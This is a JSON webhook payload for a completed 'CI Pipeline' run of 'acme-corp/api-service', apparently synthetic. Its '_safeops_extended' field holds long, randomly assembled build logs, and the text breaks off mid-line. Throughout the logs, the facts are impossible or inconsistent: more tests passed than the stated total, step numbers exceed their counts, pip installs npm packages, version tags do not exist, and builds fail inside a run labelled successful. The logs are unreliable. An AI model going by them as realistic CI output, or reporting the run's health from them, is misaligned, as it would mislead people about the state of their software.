{
  "action": "completed",
  "workflow_run": {
    "id": 797,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "4ae7799049ffae8559263345cccd2cd7ed970698",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-27T12:47:36.146584Z",
    "updated_at": "2025-11-27T12:51:02.340172Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "frank"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_staging ===\n[12:47:36] DEBUG: Memory usage: 1145MB\nCompiling lib/service.java...\nNODE_ENV=development\nGenerating source maps...\n[12:47:36] DEBUG: Memory usage: 665MB\nGET /api - 204 (13ms)\nSwitched to branch 'feature/task-804'\nnpm install: resolved 1806 packages\nFetching from https://npmjs.org/package.json\n[12:47:36] INFO: Connecting to database\nTransforming 705 files...\nCreating production build...\nChecking out master branch\nPulling image: alpine:latest\nCoverage: 98% statements, 100% branches\nTime: 87.383s\nInstalling express@1.16.3\n[12:47:36] WARN: Deprecated API usage\nStep 15/23: Testing\n[12:47:36] DEBUG: Initializing service\nStep 3/21: Testing\n[12:47:36] WARN: Deprecated API usage\nGenerating source maps...\nHEAD is now at 122a3d3\n[12:47:36] DEBUG: Loading configuration\npip: Downloading prettier-3.7.tar.gz\nLayer 4/8: COPY command\nBuilding Docker image...\nOptimizing 78 modules...\nWARNING: react has known vulnerabilities\nCache restored successfully (473MB)\nTransforming 903 files...\n[12:47:36] INFO: Connecting to database\nReady.\nGenerating source maps...\nAlready up to date.\n[12:47:36] INFO: Starting build process\nWARNING: react has known vulnerabilities\nPulling image: alpine:18\nSnapshots: 8 passed, 13 total\nStep 9/25: Testing\n[12:47:36] DEBUG: Query executed in 60ms\nStep 13/22: Building\nnpm notice: created a lockfile\nStep 1/23: Deploying\nCompiling src/service.java...\nCreating production build...\nSwitched to branch 'bugfix/task-995'\nWARNING: react has known vulnerabilities\n[12:47:36] INFO: Request completed\nTime: 37.409s\nCache restored successfully (484MB)\nTime: 45.647s\nStep 13/16: Testing\nLoading...\nTime: 21.848s\npip: Collecting prettier\nFAILED: test_api_health\nHEAD is now at dd2ea79\npip: Installing build dependencies...\nUsing Node.js 17.13.4\nTLS handshake completed\nCompiling utils/main.py...\nStep 16/21: Deploying\n[12:47:36] INFO: Request completed\nCompiling src/main.py...\nFetching from https://githubusercontent.com/package.json\nPlatform: win32-x64\nBuilding Docker image...\nStep 14/17: Linting\n[12:47:36] DEBUG: Initializing service\nHEAD is now at c2570d1\nGET /api - 200 (19ms)\nWARNING: prettier has known vulnerabilities\n\u2713 Task completed in 1816ms\nStep 3/15: Running migrations\n[12:47:36] DEBUG: Memory usage: 640MB\nWARNING: lodash has known vulnerabilities\n[12:47:36] WARN: Deprecated API usage\n[12:47:36] INFO: Starting build process\nVerifying...\nWaiting...\n\u2717 build failed with exit code 77\nStep 8/25: Linting\nNODE_ENV=test\nCache saved successfully\nWARNING: lodash has known vulnerabilities\nConnection established\n[12:47:36] INFO: Cache refreshed\nFetching submodules...\nCache restored successfully (300MB)\nnpm notice: package.json updated\nMinifying vendor.js\nUsing Node.js 14.18.4\nyarn add: Done in 13.98s\nOK\nArtifact downloaded: 24MB\n\u2713 Step 'build' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFetching from https://npmjs.org/package.json\nArtifact downloaded: 20MB\nOptimizing 20 modules...\nPulling image: alpine:latest\n[12:47:36] DEBUG: Memory usage: 1377MB\nConnection established\nTest Suites: 49 passed, 27 total\nFetching submodules...\nWARNING: axios has known vulnerabilities\nHEAD is now at ea775de\nHEAD is now at 46bf71f\nUsing Python 3.12\nConnection established\nStep 12/22: Running migrations\nPushing to registry...\n[12:47:36] ERROR: Connection failed\nnpm notice: created a lockfile\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact downloaded: 28MB\npip: Downloading lodash-4.6.tar.gz\nDone.\nPushing to registry...\nCache saved successfully\nWaiting...\nBundling runtime.css\nnpm install: added 321 packages\nnpm notice: package.json updated\nCoverage: 86% statements, 75% branches\nCompiling components/handler.rs...\nTests: 251 passed, 63 total\nnpm install: resolved 825 packages\nTests: 119 passed, 495 total\n[12:47:36] INFO: Connecting to database\nLayer 9/8: COPY command\nStep 10/15: Testing\npip: Installing build dependencies...\n[12:47:36] DEBUG: Initializing service\nWARNING: react has known vulnerabilities\nOptimizing 36 modules...\npip: Downloading lodash-2.1.tar.gz\nTLS handshake completed\nProcessing...\nStep 9/21: Installing dependencies\nFetching from https://githubusercontent.com/package.json\nLayer 3/10: RUN command\nStep 4/19: Deploying\n[12:47:36] WARN: Deprecated API usage\n[12:47:36] DEBUG: Initializing service\nTests: 273 passed, 473 total\n[12:47:36] DEBUG: Connection pool: 6 active\nGET /api - 204 (71ms)\n  PASS: test_auth_login (108ms)\nnpm notice: package.json updated\n  PASS: test_api_health (293ms)\n[12:47:36] DEBUG: Connection pool: 2 active\nImage pulled successfully\n[12:47:36] DEBUG: Connection pool: 12 active\n[12:47:36] DEBUG: Memory usage: 1124MB\nCache invalidated: node_modules\nStep 8/19: Linting\nPulling image: node:3.11\nDone.\nCache hit for key-6119\nnpm notice: package.json updated\n\u2713 Task completed in 2873ms\nTest Suites: 14 passed, 44 total\nSwitched to branch 'feature/task-273'\nEnvironment: test\nWARNING: lodash has known vulnerabilities\nStep 11/18: Building\npip: Downloading lodash-2.16.tar.gz\nStep 12/22: Testing\nUsing Node.js 15.4.7\n[12:47:36] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: dist.zip (12MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling components/handler.rs...\n\u2717 build failed with exit code 96\nStep 11/15: Testing\nSnapshots: 19 passed, 23 total\nCompiling components/main.py...\nWARNING: lodash has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:47:36] INFO: Starting build process\n[12:47:36] DEBUG: Query executed in 71ms\nCache miss for key-8769\nStep 10/25: Linting\nStep 18/19: Deploying\nCache invalidated: build\nArtifact uploaded: build.tar.gz (9MB)\nLayer 2/9: ENV command\nUsing Python 3.12\nStep 20/16: Installing dependencies\nOptimizing 77 modules...\nChecking out main branch\n[12:47:36] INFO: Request completed\nWaiting...\nSnapshots: 11 passed, 16 total\nnpm notice: package.json updated\nCompiling src/index.js...\nSuccess!\nInstalling webpack@4.13.10\nConnection established\nyarn add: Done in 19.61s\nCreating production build...\npip install: Successfully installed webpack-5.4\nOptimizing 49 modules...\n[12:47:36] DEBUG: Connection pool: 12 active\n\u2713 test completed\nTest Suites: 7 passed, 38 total\nSwitched to branch 'feature/task-306'\nnpm install: added 363 packages\nnpm install: resolved 1228 packages\nFetching from https://gcr.io/package.json\nGenerating source maps...\nDone.\nSnapshots: 46 passed, 21 total\nWaiting...\nChecking out main branch\nLayer 3/9: COPY command\nWARNING: eslint has known vulnerabilities\nDone.\nWARNING: axios has known vulnerabilities\nMinifying vendor.js\nOptimizing 45 modules...\nRan 126 tests in 32s\n[12:47:36] WARN: Deprecated API usage\nCache restored successfully (477MB)\nInstalling webpack@3.11.10\n\u2717 build failed with exit code 16\nStep 8/16: Linting\nWARNING: lodash has known vulnerabilities\nPulling image: node:3.11\npip install: Successfully installed react-1.3\n[12:47:36] INFO: Cache refreshed\n\u2713 All checks passed\npip: Collecting react\nWARNING: lodash has known vulnerabilities\nyarn add: Done in 10.39s\nArtifact uploaded: build.tar.gz (34MB)\nLoading...\n=== Step deploy_staging completed ===\n=== Step: restore_cache ===\nSwitched to branch 'bugfix/task-330'\nConnection established\nWaiting...\nUsing Python 3.9\nCache restored successfully (103MB)\nCompiling src/handler.rs...\n[12:47:36] DEBUG: Connection pool: 18 active\nArtifact uploaded: build.tar.gz (40MB)\nOK\nOptimizing 35 modules...\nnpm install: added 411 packages\nTime: 74.787s\n\u2713 Task completed in 2020ms\nHEAD is now at 6cc6ce2\nnpm install: added 423 packages\nFetching from https://npmjs.org/package.json\nnpm install: resolved 882 packages\n\u2713 All checks passed\n\u2713 All checks passed\nNODE_ENV=test\n  PASS: test_auth_login (337ms)\nUsing Node.js 19.0.1\nUploading artifact 'build' (21 files)\nTime: 31.360s\n\u2713 All checks passed\nLayer 1/10: COPY command\nTLS handshake completed\nVerifying...\nDone.\nWaiting...\nTransforming 417 files...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-1345\nCache restored successfully (417MB)\n[12:47:36] DEBUG: Initializing service\npip: Downloading prettier-3.2.tar.gz\n[12:47:36] INFO: Starting build process\nStep 4/21: Testing\n[12:47:36] DEBUG: Connection pool: 1 active\nOptimizing 43 modules...\n[12:47:36] INFO: Request completed\nStep 4/22: Deploying\nCache invalidated: build\nCompiling components/index.js...\nProcessing...\nUsing Node.js 15.5.6\nOptimizing 99 modules...\nUploading artifact 'build' (9 files)\nTLS handshake completed\nPOST /upload - 202 (272ms)\npip: Installing build dependencies...\nBuilding Docker image...\nyarn add: Done in 18.50s\nStep 5/23: Building\nArtifact downloaded: 28MB\nCompiling src/utils.go...\nFinished.\nArtifact uploaded: build.tar.gz (17MB)\nOK\nTest Suites: 42 passed, 44 total\nMinifying main.js\n[12:47:36] DEBUG: Memory usage: 1167MB\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nNODE_ENV=test\nStep 6/19: Deploying\n[12:47:36] DEBUG: Initializing service\nStep 16/18: Running migrations\nOptimizing 17 modules...\nAlready up to date.\nWaiting...\npip: Downloading lodash-2.1.tar.gz\nStep 3/19: Building\nArtifact uploaded: build.tar.gz (6MB)\nTests: 307 passed, 288 total\nCompleted.\nCache invalidated: build\nnpm notice: package.json updated\n[12:47:36] DEBUG: Initializing service\nStep 11/18: Installing dependencies\nMinifying vendor.js\nLoading...\nReady.\nUsing Node.js 20.1.8\n  PASS: test_auth_login (348ms)\nConnection established\nSuccess!\nTest Suites: 50 passed, 45 total\nConnection established\n[12:47:36] DEBUG: Connection pool: 14 active\nCache miss for key-5822\nArtifact uploaded: build.tar.gz (36MB)\nCompiling utils/main.py...\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:47:36] INFO: Cache refreshed\n\u2713 Step 'setup' succeeded\nPOST /data - 201 (138ms)\n[12:47:36] DEBUG: Connection pool: 12 active\nStep 5/15: Running migrations\nStep 2/17: Running migrations\nStep 8/25: Testing\nEnvironment: production\n[12:47:36] DEBUG: Memory usage: 144MB\npip install: Successfully installed webpack-1.8\nUploading artifact 'coverage' (22 files)\nPlatform: linux-x64\nConnection established\npip: Collecting lodash\nConnection established\nyarn add: Done in 5.86s\nOptimizing 17 modules...\nTest Suites: 48 passed, 44 total\nStep 13/20: Deploying\nRan 180 tests in 34s\nLayer 1/13: ENV command\nReady.\n  PASS: integration/test_user_create.spec.js\nSuccess!\nStep 6/23: Testing\n\u2713 package completed\nnpm notice: package.json updated\nCompleted.\nnpm notice: package.json updated\nCompiling utils/main.py...\nSuccess!\n[12:47:36] ERROR: Connection failed\nCompiling src/main.py...\n[12:47:36] INFO: Request completed\nCompiling components/main.py...\n[12:47:36] DEBUG: Initializing service\nCompiling components/service.java...\nArtifact uploaded: dist.zip (2MB)\nWARNING: prettier has known vulnerabilities\nStep 3/20: Linting\nProcessing...\nCache hit for key-6194\nUsing Node.js 20.19.7\nTests: 435 passed, 79 total\nCreating production build...\nCompiling src/handler.rs...\nTests: 142 passed, 282 total\n\u2713 deploy completed\nPOST /api - 201 (128ms)\nDone.\n[12:47:36] DEBUG: Query executed in 97ms\nStep 9/19: Linting\n\u2713 Task completed in 2854ms\nCompleted.\nOptimizing 68 modules...\nProcessing...\nTLS handshake completed\nCreating production build...\nArtifact downloaded: 13MB\nFinished.\n[12:47:36] DEBUG: Query executed in 50ms\nInstalling lodash@1.1.5\nProcessing...\nStep 11/22: Testing\nAlready up to date.\nAlready up to date.\nBundling main.css\nFetching submodules...\nWARNING: webpack has known vulnerabilities\npip: Downloading jest-4.1.tar.gz\nException: TypeError\nInstalling webpack@5.14.6\n[12:47:36] WARN: Deprecated API usage\nLoading...\nCache miss for key-8053\n[12:47:36] WARN: Deprecated API usage\n[12:47:36] DEBUG: Initializing service\nCompiling src/utils.go...\nGET /status - 200 (76ms)\npip install: Successfully installed eslint-2.9\nNODE_ENV=development\nInstalling axios@3.1.10\n[12:47:36] WARN: Deprecated API usage\nGET /api - 200 (81ms)\n[12:47:36] ERROR: Connection failed\nSwitched to branch 'bugfix/task-674'\nTest Suites: 48 passed, 29 total\n[12:47:36] INFO: Cache refreshed\nnpm notice: created a lockfile\nRan 92 tests in 19s\n[12:47:36] DEBUG: Query executed in 9ms\nBuilding Docker image...\nConnection established\n[12:47:36] ERROR: Connection failed\n[12:47:36] DEBUG: Connection pool: 15 active\nVerifying...\nOptimizing 80 modules...\nnpm notice: created a lockfile\nPulling image: python:18\nStep 18/23: Testing\nFAILED: test_cache_hit\nDone.\npip: Downloading jest-2.11.tar.gz\n\u2713 Task completed in 2301ms\nStep 9/24: Linting\nFinished.\nWARNING: prettier has known vulnerabilities\nStep 12/17: Deploying\nnpm notice: package.json updated\nCompiling lib/utils.go...\nCache saved successfully\nCache restored successfully (163MB)\n  PASS: test_auth_login (353ms)\nnpm notice: package.json updated\nCompiling src/main.py...\nCache restored successfully (472MB)\nImage pulled successfully\n[12:47:36] WARN: Deprecated API usage\nCache saved successfully\nTest Suites: 44 passed, 15 total\nnpm install: resolved 1656 packages\nStep 14/15: Linting\nCreating production build...\nOK\nnpm install: added 325 packages\nnpm install: resolved 1774 packages\nCache restored successfully (236MB)\nTests: 312 passed, 206 total\n[12:47:36] DEBUG: Query executed in 46ms\nArtifact downloaded: 33MB\nUsing Node.js 16.13.5\nCache miss for key-4902\nVerifying...\nTests: 257 passed, 488 total\nCache hit for key-7198\nBundling runtime.js\nGenerating source maps...\nLoading...\nOptimizing 66 modules...\nOptimizing 38 modules...\nLoading...\nOptimizing 28 modules...\nTime: 112.107s\nSuccess!\nyarn add: Done in 5.45s\n[12:47:36] DEBUG: Initializing service\nnpm install: added 212 packages\n=== Step restore_cache completed ===\n=== Step: e2e_tests ===\n[12:47:36] INFO: Processing request\nArtifact uploaded: dist.zip (76MB)\n\u2713 Step 'install' succeeded\nStep 12/24: Deploying\n\u2713 Step 'checkout' succeeded\nCoverage: 77% statements, 100% branches\nFinished.\n[12:47:36] INFO: Starting build process\nMinifying app.js\nHEAD is now at 9198333\nCompiling lib/utils.go...\n\u2713 Task completed in 1901ms\nHEAD is now at 9cbd037\nCompiling src/service.java...\n[12:47:36] ERROR: Connection failed\nCompiling utils/utils.go...\nException: TypeError\nCache saved successfully\nCompleted.\nOK\nTests: 313 passed, 373 total\n[12:47:36] ERROR: Connection failed\npip: Installing build dependencies...\n[12:47:36] DEBUG: Initializing service\nInstalling express@2.1.1\nTime: 109.792s\n[12:47:36] DEBUG: Connection pool: 6 active\n[12:47:36] INFO: Starting build process\nnpm install: added 218 packages\nTest Suites: 7 passed, 18 total\n  PASS: test_user_create (237ms)\nPulling image: python:3.11\nHEAD is now at 3056424\nOK\nCompiling utils/index.js...\nStep 14/19: Running migrations\n[12:47:36] INFO: Processing request\nPOST /data - 202 (58ms)\n[12:47:36] DEBUG: Loading configuration\nBundling runtime.js\n[12:47:36] DEBUG: Memory usage: 380MB\nnpm install: resolved 995 packages\nStep 5/20: Building\nHEAD is now at f0a4d7f\nWARNING: eslint has known vulnerabilities\nPulling image: alpine:latest\n  PASS: test_db_connect (31ms)\nStep 6/19: Deploying\nChecking out master branch\nCache invalidated: build\nTime: 64.388s\nTests: 499 passed, 62 total\nBundling runtime.css\nnpm install: added 179 packages\nGET /health - 200 (66ms)\nFetching from https://googleapis.com/package.json\nSwitched to branch 'feature/task-993'\n[12:47:36] WARN: Deprecated API usage\nReady.\nMinifying app.js\n[12:47:36] INFO: Processing request\n[12:47:36] INFO: Request completed\nCoverage: 83% statements, 99% branches\nCache saved successfully\nMinifying main.js\nImage pulled successfully\nWARNING: webpack has known vulnerabilities\nStep 9/16: Building\nCache restored successfully (139MB)\npip: Installing build dependencies...\nCreating production build...\nnpm notice: created a lockfile\n[12:47:36] WARN: Deprecated API usage\nStep 19/22: Deploying\n\u2713 All checks passed\nNODE_ENV=production\nCompiling lib/utils.go...\nStep 20/15: Linting\nOptimizing 22 modules...\nCoverage: 99% statements, 99% branches\nOptimizing 55 modules...\nLoading...\nCache restored successfully (448MB)\nNODE_ENV=production\nProcessing...\n[12:47:36] WARN: Deprecated API usage\nVerifying...\nUsing Node.js 15.12.9\nLoading...\n[12:47:36] ERROR: Connection failed\nCache miss for key-4897\nStep 17/22: Building\nnpm install: added 436 packages\nFetching from https://googleapis.com/package.json\nVerifying...\nArtifact downloaded: 42MB\nFAILED: test_api_health\nStep 12/20: Building\n\u2717 build failed with exit code 55\nAlready up to date.\nArtifact uploaded: dist.zip (81MB)\nCache hit for key-4201\nGET /health - 200 (24ms)\nCache miss for key-9850\nImage pulled successfully\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTest Suites: 45 passed, 20 total\nyarn add: Done in 25.67s\n[12:47:36] DEBUG: Query executed in 28ms\nStep 2/20: Testing\nCompiling utils/index.js...\nCompiling components/index.js...\nTransforming 319 files...\nStep 14/19: Installing dependencies\nException: ValueError\nImage pulled successfully\nStep 8/22: Deploying\n\u2717 build failed with exit code 104\nnpm notice: created a lockfile\nnpm install: added 132 packages\nnpm notice: package.json updated\nVerifying...\nCache hit for key-4180\n  PASS: test_auth_login (74ms)\nCache hit for key-5780\nVerifying...\n[12:47:36] DEBUG: Connection pool: 18 active\nPushing to registry...\n\u2713 Task completed in 4925ms\nTests: 187 passed, 497 total\nOptimizing 41 modules...\n  PASS: test_cache_hit (355ms)\nUploading artifact 'coverage' (24 files)\nReady.\nLoading...\nCreating production build...\nProcessing...\nWaiting...\nSuccess!\nCompiling components/utils.go...\nCache invalidated: node_modules\nBuilding Docker image...\nSwitched to branch 'bugfix/task-866'\n[12:47:36] INFO: Processing request\nPOST /upload - 200 (488ms)\nException: RuntimeError\nMinifying main.js\npip: Installing build dependencies...\nyarn add: Done in 27.82s\n[12:47:36] INFO: Processing request\nLoading...\nOK\nGET /health - 204 (37ms)\nGET /health - 204 (61ms)\nStep 8/17: Testing\nCache hit for key-5730\nnpm install: added 311 packages\nArtifact uploaded: dist.zip (28MB)\nnpm notice: created a lockfile\nHEAD is now at 4925e09\nCoverage: 94% statements, 91% branches\n[12:47:36] WARN: Deprecated API usage\nChecking out develop branch\nOK\nWARNING: react has known vulnerabilities\nProcessing...\n[12:47:36] INFO: Connecting to database\nCache miss for key-6343\nArtifact uploaded: dist.zip (6MB)\nBuilding Docker image...\nChecking out main branch\nStep 1/15: Deploying\nStep 5/18: Linting\nEnvironment: test\n[12:47:36] DEBUG: Initializing service\nLayer 7/9: RUN command\nnpm install: resolved 833 packages\nHEAD is now at 3c9b9ad\nGET /status - 204 (12ms)\nCache saved successfully\nGET /status - 204 (71ms)\n[12:47:36] INFO: Connecting to database\n  PASS: test_db_connect (43ms)\nPlatform: linux-x64\nTransforming 407 files...\nChecking out develop branch\nWaiting...\nSwitched to branch 'bugfix/task-752'\nSuccess!\nRan 41 tests in 42s\nTransforming 897 files...\nCache invalidated: build\nPlatform: win32-x64\n\u2713 deploy completed\n[12:47:36] WARN: Deprecated API usage\nyarn add: Done in 29.61s\nTests: 348 passed, 268 total\npip: Collecting axios\nMinifying vendor.js\n[12:47:36] DEBUG: Initializing service\nOptimizing 70 modules...\nConnection established\nStep 1/21: Testing\n\u2713 build completed\n\u2713 Step 'test' succeeded\n\u2713 build completed\nCreating production build...\nOptimizing 98 modules...\nyarn add: Done in 15.51s\nyarn add: Done in 11.99s\npip: Downloading jest-5.13.tar.gz\nStep 17/22: Building\n[12:47:36] DEBUG: Connection pool: 8 active\n  PASS: test_api_health (440ms)\nyarn add: Done in 14.86s\nnpm notice: package.json updated\n[12:47:36] DEBUG: Initializing service\nStep 3/15: Installing dependencies\nSwitched to branch 'feature/task-687'\nCache restored successfully (454MB)\nArtifact downloaded: 6MB\nLayer 6/11: COPY command\nFinished.\nLayer 8/14: ENV command\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: jest has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPlatform: darwin-arm64\nPlatform: darwin-arm64\n\u2713 Task completed in 4889ms\n[12:47:36] INFO: Cache refreshed\nProcessing...\nFinished.\n[12:47:36] WARN: Deprecated API usage\npip install: Successfully installed axios-3.19\nTLS handshake completed\nSnapshots: 16 passed, 2 total\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nHEAD is now at c38b1e8\nStep 14/19: Running migrations\n=== Step e2e_tests completed ===\n=== Step: build ===\nTest Suites: 39 passed, 10 total\n[12:47:36] INFO: Connecting to database\nWARNING: express has known vulnerabilities\nRan 168 tests in 7s\nFetching submodules...\nCompiling components/main.py...\nNODE_ENV=development\nStep 14/25: Testing\nCache restored successfully (331MB)\n[12:47:36] DEBUG: Initializing service\n[12:47:36] DEBUG: Loading configuration\nPlatform: darwin-arm64\n[12:47:36] DEBUG: Loading configuration\nEnvironment: development\n[12:47:36] DEBUG: Initializing service\nnpm notice: created a lockfile\nyarn add: Done in 16.49s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWaiting...\nNODE_ENV=development\npip: Collecting react\nArtifact downloaded: 14MB\nPulling image: alpine:3.11\nMinifying main.js\n\u2713 Task completed in 2249ms\nBuilding Docker image...\nCompiling utils/handler.rs...\n[12:47:36] INFO: Starting build process\nCompiling src/utils.go...\nOptimizing 10 modules...\nnpm notice: package.json updated\npip: Installing build dependencies...\nPlatform: linux-x64\nStep 9/20: Installing dependencies\nInstalling lodash@4.6.2\nException: NullPointerException\n[12:47:36] INFO: Cache refreshed\nChecking out master branch\nFetching submodules...\nCache invalidated: node_modules\nCoverage: 88% statements, 91% branches\n  PASS: unit/test_db_connect.spec.js\nWARNING: webpack has known vulnerabilities\nStep 11/17: Installing dependencies\nEnvironment: test\nUploading artifact 'build' (44 files)\nDone.\n[12:47:36] INFO: Request completed\nCoverage: 73% statements, 64% branches\n[12:47:36] WARN: Deprecated API usage\nOK\nRan 65 tests in 31s\nWARNING: webpack has known vulnerabilities\nTest Suites: 38 passed, 10 total\n[12:47:36] INFO: Processing request\n[12:47:36] WARN: Deprecated API usage\nWARNING: lodash has known vulnerabilities\nUploading artifact 'build' (34 files)\nHEAD is now at fbe4cf5\npip: Installing build dependencies...\nLayer 4/12: RUN command\nRan 123 tests in 16s\nCompleted.\nSwitched to branch 'bugfix/task-101'\nArtifact uploaded: build.tar.gz (34MB)\nAlready up to date.\nCache restored successfully (150MB)\nFetching submodules...\nPOST /data - 201 (72ms)\nPulling image: python:latest\nArtifact uploaded: build.tar.gz (39MB)\nCompleted.\nWARNING: prettier has known vulnerabilities\n[12:47:36] INFO: Cache refreshed\nnpm notice: created a lockfile\nOK\n[12:47:36] INFO: Request completed\nPOST /api - 201 (319ms)\nBundling main.css\nTest Suites: 20 passed, 41 total\nGenerating source maps...\nTLS handshake completed\nnpm notice: package.json updated\nNODE_ENV=development\nCache saved successfully\nArtifact uploaded: build.tar.gz (15MB)\nTest Suites: 14 passed, 28 total\nHEAD is now at 5ed79e4\nGenerating source maps...\nTests: 122 passed, 302 total\nSuccess!\nPushing to registry...\n[12:47:36] DEBUG: Loading configuration\nFinished.\n[12:47:36] DEBUG: Connection pool: 14 active\nPOST /upload - 202 (462ms)\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: express has known vulnerabilities\n\u2713 Task completed in 505ms\nFetching submodules...\nArtifact downloaded: 35MB\nMinifying main.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 14/15: Building\nStep 14/25: Running migrations\nPlatform: linux-x64\nArtifact downloaded: 30MB\nPushing to registry...\nCompiling utils/app.ts...\npip: Collecting jest\n[12:47:36] DEBUG: Query executed in 99ms\nSuccess!\nLayer 8/9: COPY command\npip: Collecting jest\nBuilding Docker image...\nStep 3/19: Building\nBundling vendor.css\nTLS handshake completed\nArtifact downloaded: 46MB\nUsing Node.js 15.16.2\nnpm notice: package.json updated\nBuilding Docker image...\nInstalling eslint@5.6.8\n[12:47:36] DEBUG: Connection pool: 3 active\n[12:47:36] INFO: Request completed\nAlready up to date.\n[12:47:36] INFO: Cache refreshed\nTLS handshake completed\npip: Collecting jest\nWaiting...\nCompiling components/service.java...\n[12:47:36] DEBUG: Initializing service\n\u2713 build completed\nStep 17/16: Building\nUsing Python 3.10\n\u2713 Step 'test' succeeded\nCache miss for key-2592\nMinifying app.js\n[12:47:36] ERROR: Connection failed\nWARNING: lodash has known vulnerabilities\nTest Suites: 44 passed, 15 total\nPulling image: alpine:3.11\nCache hit for key-2004\n[12:47:36] DEBUG: Initializing service\nStep 12/19: Testing\nCache invalidated: build\n[12:47:36] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling react@1.5.9\nOptimizing 68 modules...\nHEAD is now at 28fa375\nCompiling lib/app.ts...\nAlready up to date.\nnpm install: added 440 packages\nStep 16/22: Deploying\nSwitched to branch 'feature/task-790'\nLoading...\n\u2713 Task completed in 4413ms\nLayer 5/9: ENV command\nChecking out main branch\n[12:47:36] DEBUG: Connection pool: 7 active\nStep 19/21: Deploying\nHEAD is now at e4ca9c8\n[12:47:36] DEBUG: Initializing service\n[12:47:36] DEBUG: Query executed in 55ms\nnpm notice: created a lockfile\nUsing Python 3.9\nPOST /data - 202 (59ms)\nCompiling utils/app.ts...\npip: Collecting axios\n\u2713 Task completed in 3508ms\nArtifact downloaded: 6MB\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:47:36] INFO: Processing request\nStep 3/15: Building\nnpm notice: created a lockfile\nImage pulled successfully\n[12:47:36] DEBUG: Memory usage: 1597MB\nBuilding Docker image...\n\u2717 build failed with exit code 82\nChecking out develop branch\nTests: 228 passed, 498 total\nRan 46 tests in 57s\nBuilding Docker image...\nyarn add: Done in 10.16s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nReady.\nOK\nWARNING: eslint has known vulnerabilities\nCompiling utils/index.js...\n  PASS: test_cache_hit (184ms)\n\u2713 package completed\nnpm install: added 99 packages\nCache restored successfully (336MB)\nPushing to registry...\nCreating production build...\n[12:47:36] WARN: Deprecated API usage\nUsing Python 3.12\nFinished.\n  PASS: e2e/test_auth_login.spec.js\n  PASS: test_db_connect (155ms)\nnpm install: resolved 1263 packages\n\u2713 Step 'setup' succeeded\n[12:47:36] WARN: Deprecated API usage\nProcessing...\nUsing Node.js 20.5.5\nHEAD is now at 1dd57b5\n[12:47:36] DEBUG: Loading configuration\nException: ValueError\nArtifact uploaded: build.tar.gz (40MB)\nGET /health - 204 (25ms)\nStep 1/15: Installing dependencies\nBundling main.js\npip: Downloading express-5.0.tar.gz\nStep 5/21: Running migrations\nAlready up to date.\nWARNING: lodash has known vulnerabilities\nCache miss for key-3366\nOptimizing 33 modules...\nStep 15/21: Testing\nPushing to registry...\nWARNING: lodash has known vulnerabilities\n  PASS: test_user_create (272ms)\nPOST /upload - 201 (274ms)\n[12:47:36] DEBUG: Memory usage: 1369MB\n\u2713 build completed\nCache miss for key-5404\nFinished.\n[12:47:36] WARN: Deprecated API usage\n\u2717 build failed with exit code 82\nWaiting...\nSuccess!\nImage pulled successfully\n  PASS: test_api_health (348ms)\nNODE_ENV=production\n\u2713 Task completed in 261ms\nStep 6/23: Installing dependencies\nTime: 108.262s\nLayer 3/9: COPY command\npip: Downloading express-4.9.tar.gz\nCreating production build...\n=== Step build completed ===\n=== Step: unit_tests ===\nReady.\nMinifying vendor.js\nArtifact uploaded: dist.zip (23MB)\nTest Suites: 7 passed, 36 total\nCompiling utils/main.py...\n[12:47:36] WARN: Deprecated API usage\nGET /status - 200 (45ms)\n\u2713 test completed\n  PASS: unit/test_auth_login.spec.js\n[12:47:36] INFO: Connecting to database\nUploading artifact 'dist' (10 files)\nArtifact uploaded: build.tar.gz (21MB)\nCache saved successfully\nSwitched to branch 'feature/task-366'\n[12:47:36] WARN: Deprecated API usage\nTransforming 331 files...\nUsing Python 3.11\nLayer 4/8: RUN command\nSnapshots: 14 passed, 38 total\nCoverage: 78% statements, 63% branches\nStep 3/16: Testing\nCache hit for key-1227\n[12:47:36] WARN: Deprecated API usage\nNODE_ENV=development\nTransforming 560 files...\nCreating production build...\npip: Installing build dependencies...\nFinished.\n[12:47:36] DEBUG: Loading configuration\nStep 16/17: Deploying\nEnvironment: production\npip: Collecting jest\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:47:36] INFO: Starting build process\n[12:47:36] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nUsing Node.js 17.8.6\nPOST /data - 200 (345ms)\n\u2713 Task completed in 1664ms\npip: Downloading lodash-5.18.tar.gz\nOptimizing 74 modules...\nChecking out master branch\n  PASS: integration/test_api_health.spec.js\nFetching from https://registry.npmjs.org/package.json\nFAILED: test_api_health\npip: Collecting axios\npip: Installing build dependencies...\nArtifact downloaded: 21MB\npip: Installing build dependencies...\n[12:47:36] INFO: Cache refreshed\nMinifying main.js\nSuccess!\npip: Collecting express\nAlready up to date.\n[12:47:36] DEBUG: Query executed in 8ms\n[12:47:36] WARN: Deprecated API usage\nNODE_ENV=production\nTest Suites: 24 passed, 12 total\nPushing to registry...\nCache invalidated: build\n[12:47:36] INFO: Starting build process\n  PASS: test_api_health (55ms)\nGenerating source maps...\nChecking out main branch\nWARNING: webpack has known vulnerabilities\nPushing to 